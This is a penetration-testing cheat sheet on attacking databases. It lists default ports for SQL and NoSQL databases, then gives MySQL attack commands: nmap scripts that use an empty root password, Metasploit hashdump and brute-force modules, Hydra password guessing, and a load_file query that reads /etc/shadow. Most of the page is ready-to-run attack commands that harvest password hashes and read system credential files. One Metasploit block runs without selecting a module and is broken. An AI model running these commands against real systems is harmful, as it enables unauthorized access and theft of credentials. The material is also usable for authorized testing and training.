---
title: "SQL"
description: ">-"
---




:::note
### Relational databases default ports <a href="#relational-databases" id="relational-databases"></a>
:::

| Database               | Port(s)    | Doc                                                                                     |
| ---------------------- | ---------- | --------------------------------------------------------------------------------------- |
| MaxDB                  | 7210       | [Doc](http://maxdb.sap.com/doc/7\_7/44/bf820566fa5e91e10000000a422035/content.htm)      |
| **MySQL**              | 3306       | [Doc](https://dev.mysql.com/doc/refman/5.7/en/security-guidelines.html)                 |
| Oracle DB              | 1521, 1830 | [Doc](https://docs.oracle.com/cd/B19306\_01/network.102/b14213/protocoladd.htm#i470539) |
| **PostgreSQL**         | 5432       | [Doc](https://www.postgresql.org/docs/9.1/static/runtime-config-connection.html)        |
| **SQL Server (MSSQL)** | 1433, 1434 | [Doc](https://msdn.microsoft.com/de-ch/library/cc646023.aspx)                           |

:::note
### NoSQL databases and other data stores  default ports <a href="#nosql-databases-and-other-data-stores" id="nosql-databases-and-other-data-stores"></a>
:::

| Database      | Port(s)                    | Doc                                                                                                  |
| ------------- | -------------------------- | ---------------------------------------------------------------------------------------------------- |
| Cassandra     | 7000, 7001, 9042           | [Doc](https://cassandra.apache.org/doc/latest/faq/index.html#what-ports)                             |
| CouchDB       | 5984                       | [Doc](http://docs.couchdb.org/en/2.0.0/config/http.html)                                             |
| Elasticsearch | 9200, 9300                 | [Doc](https://www.elastic.co/guide/en/elasticsearch/guide/current/\_talking\_to\_elasticsearch.html) |
| **MongoDB**   | 27017, 27018, 27019, 28017 | [Doc](https://docs.mongodb.com/v3.2/reference/default-mongodb-port/)                                 |
| Neo4J         | 7473, 7474                 | [Doc](https://neo4j.com/docs/stable/tools-webadmin.html)                                             |
| **Redis**     | 6379                       | [Doc](https://redis.io/topics/quickstart)                                                            |

## Enum

<pre class="language-bash"><code class="lang-bash"># Default scan
nmap $IP -sV -p 3306 

# Empty password script
nmap $IP -sV -p 3306 --script=mysql-empty-password

<strong># Get Mysql info
</strong>nmap $IP -sV -p 3306 --script=mysql-info

# Get mysql users
nmap $IP -sV -p 3306 --script=mysql-users --script-args="mysqluser='root',mysqlpass=''"

<strong># Get mysql databases
</strong>nmap $IP -sV -p 3306 --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''"

# Get mysql variables
nmap $IP -sV -p 3306 --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''"

# mysql audit
nmap $IP -sV -p 3306 --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"

# Try to connect directly without a password
mysql -h $IP -u root

# Run query
nmap $IP -sV -p 3306 --script=mysql-query --script-args="query='select count(*) from books.authors;',mysqluser='root',mysqlpass=''"

# Metasploit way
msfconsole
set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
setg rhosts $IP
set verbose false
run

## Hashdump
msfconsole
use auxiliary/scanner/mysql/mysql_hashdump 
setg rhosts $IP
set username root
set password ""
run</code></pre>

#### Manipulate local files via db

```sql
# connect to instance
mysql -h $IP -u root

# read local file
select load_file("/etc/shadow");


```

## Bruteforce

```bash
# Metasploit way
msfconsole
use auxiliary/scanner/mysql/mysql_login
setg rhosts $IP
set verbose false
set stop_on_success true
set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set username root
run

# Hydra
hydra -l root -P  /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt $IP mysql
```
